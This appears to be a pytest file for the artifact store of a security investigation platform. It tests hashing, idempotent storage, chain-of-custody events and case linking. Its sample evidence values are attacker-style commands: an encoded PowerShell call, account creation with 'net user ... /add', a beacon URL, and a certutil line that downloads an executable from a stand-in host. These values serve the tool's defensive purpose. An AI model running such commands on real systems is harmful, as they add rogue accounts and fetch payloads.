"""tests/rc5/api/test_v2_artifacts.py · R2 Artifact Store tests.

Structural + idempotency tests only — no seed dependency. Every test
writes its own artifact into a scoped case_id and cleans up implicitly
via unique sha256s.
"""
from __future__ import annotations
import os
import pytest


@pytest.fixture(scope="module", autouse=True)
def _env_flags():
    """Session conftest sets these; kept as backstop for isolated runs."""
    os.environ.setdefault("NIVX_FLAG_ARTIFACT_STORE", "shadow")
    yield


def _db():
    from motor.motor_asyncio import AsyncIOMotorClient
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    return client[os.environ["DB_NAME"]]


# ─── Schema + hashing ────────────────────────────────────────────────
def test_artifact_iid_is_deterministic():
    from v2.artifact_store.schema import build_artifact_iid, compute_sha256
    sha = compute_sha256("powershell -enc AAAA")
    iid1 = build_artifact_iid(sha, "command_line")
    iid2 = build_artifact_iid(sha, "command_line")
    assert iid1 == iid2
    assert iid1.startswith("art_")
    assert len(iid1) == len("art_") + 12


def test_artifact_iid_differs_by_kind():
    """Same sha256 but different kind must produce different IIDs."""
    from v2.artifact_store.schema import build_artifact_iid, compute_sha256
    sha = compute_sha256("evil.exe")
    a = build_artifact_iid(sha, "command_line")
    b = build_artifact_iid(sha, "file")
    assert a != b


# ─── CRUD round-trip ─────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_create_then_get_by_iid():
    from v2.artifact_store import create_or_update, get_by_iid
    db = _db()
    art = await create_or_update(
        db, kind="command_line",
        value="cmd /c whoami /all",
        source="test", case_id="test-case-r2-a",
        actor="test-user",
    )
    fetched = await get_by_iid(db, art.artifact_iid)
    assert fetched is not None
    assert fetched.artifact_iid == art.artifact_iid
    assert fetched.sha256 == art.sha256
    assert fetched.kind == "command_line"
    assert fetched.value == "cmd /c whoami /all"
    assert fetched.mime_type == "text/plain"  # default
    assert fetched.size == len(b"cmd /c whoami /all")
    assert "test-case-r2-a" in fetched.related_case_ids
    # Every create logs a custody event
    assert len(fetched.chain_of_custody) >= 1
    assert fetched.chain_of_custody[0].action == "ingested"


@pytest.mark.asyncio
async def test_create_is_idempotent_and_merges_links():
    """Two calls with same (kind, sha) must return the same IID and
    grow the related_case_ids set — never duplicate."""
    from v2.artifact_store import create_or_update, get_by_iid
    db = _db()
    art1 = await create_or_update(
        db, kind="command_line", value="net user backup_admin /add",
        source="test", case_id="test-case-r2-b", actor="user-1",
    )
    art2 = await create_or_update(
        db, kind="command_line", value="net user backup_admin /add",
        source="test", case_id="test-case-r2-c", actor="user-2",
    )
    assert art1.artifact_iid == art2.artifact_iid
    fetched = await get_by_iid(db, art1.artifact_iid)
    assert set(fetched.related_case_ids) >= {"test-case-r2-b", "test-case-r2-c"}
    # Two ingests → at least two custody events
    ingest_events = [c for c in fetched.chain_of_custody if c.action == "ingested"]
    assert len(ingest_events) >= 2


@pytest.mark.asyncio
async def test_append_custody():
    from v2.artifact_store import create_or_update, append_custody
    db = _db()
    art = await create_or_update(
        db, kind="url", value="http://malicious.example/beacon",
        source="test", case_id="test-case-r2-d",
    )
    updated = await append_custody(
        db, artifact_iid=art.artifact_iid,
        actor="analyst@nivxray.com", action="reviewed",
        detail="opened in trajectory UI",
    )
    assert updated is not None
    assert any(c.action == "reviewed" and c.actor == "analyst@nivxray.com"
               for c in updated.chain_of_custody)


@pytest.mark.asyncio
async def test_link_observation_and_entity():
    from v2.artifact_store import create_or_update, link_observation, link_entity
    db = _db()
    art = await create_or_update(
        db, kind="command_line", value="wbadmin start backup",
        source="test", case_id="test-case-r2-e",
    )
    r1 = await link_observation(db, art.artifact_iid, "obs_zzz_1")
    r2 = await link_entity(db, art.artifact_iid, "ent_backup_bin")
    assert r1 and r2
    assert "obs_zzz_1" in r2.related_observation_iids
    assert "ent_backup_bin" in r2.related_entity_iids


@pytest.mark.asyncio
async def test_list_by_case():
    from v2.artifact_store import create_or_update, list_by_case
    db = _db()
    case_id = "test-case-r2-list"
    for cmd in ("cmd /c whoami", "powershell -enc AAAB", "net user"):
        await create_or_update(db, kind="command_line", value=cmd,
                               source="test", case_id=case_id)
    listed = await list_by_case(db, case_id, kind="command_line", limit=100)
    values = {a.value for a in listed}
    assert values == {"cmd /c whoami", "powershell -enc AAAB", "net user"}


# ─── HTTP-layer sanity (calls router functions directly) ─────────────
@pytest.mark.asyncio
async def test_http_create_and_read_flow():
    """End-to-end via the router functions — bypass require_admin."""
    from v2.routers import artifacts as m
    real = m._db
    m._db = _db()
    try:
        create = await m.create_artifact(
            payload={
                "kind": "command_line",
                "value": "certutil -urlcache -f http://x/y.exe out.exe",
                "case_id": "test-case-r2-http",
                "source": "manual",
            },
            _={"email": "admin@nivxray.com"},
        )
        assert create["ok"] is True
        iid = create["artifact"]["artifact_iid"]
        read = await m.read_artifact(iid, _={"email": "admin@nivxray.com"})
        assert read["artifact"]["artifact_iid"] == iid
        # By-sha
        sha = create["artifact"]["sha256"]
        by_sha = await m.read_artifact_by_sha(sha, kind="command_line",
                                              _={"email": "admin@nivxray.com"})
        assert by_sha["artifact"]["artifact_iid"] == iid
        # Custody append
        custody = await m.add_custody(
            iid, payload={"action": "sealed", "detail": "case closed"},
            admin={"email": "admin@nivxray.com"},
        )
        actions = [c["action"] for c in custody["artifact"]["chain_of_custody"]]
        assert "sealed" in actions
    finally:
        m._db = real


@pytest.mark.asyncio
async def test_http_read_404_on_unknown_iid():
    from fastapi import HTTPException
    from v2.routers import artifacts as m
    real = m._db
    m._db = _db()
    try:
        with pytest.raises(HTTPException) as exc:
            await m.read_artifact("art_deadbeef0000", _={"email": "admin@nivxray.com"})
        assert exc.value.status_code == 404
    finally:
        m._db = real


# ─── RC5 immutability ────────────────────────────────────────────────
def test_artifact_store_has_no_rc5_imports():
    """Governance §RC5-Immutability: v2/artifact_store must never
    import engine.* or routers.rc5_*."""
    import v2.artifact_store, v2.artifact_store.schema, v2.artifact_store.store
    from pathlib import Path
    for m in (v2.artifact_store, v2.artifact_store.schema, v2.artifact_store.store):
        src_file = getattr(m, "__file__", "")
        if not src_file:
            continue
        src = Path(src_file).read_text()
        for banned in ("from engine.", "import engine.",
                       "from routers.rc5", "import routers.rc5"):
            assert banned not in src, f"{m.__name__} imports RC5 via {banned!r}"
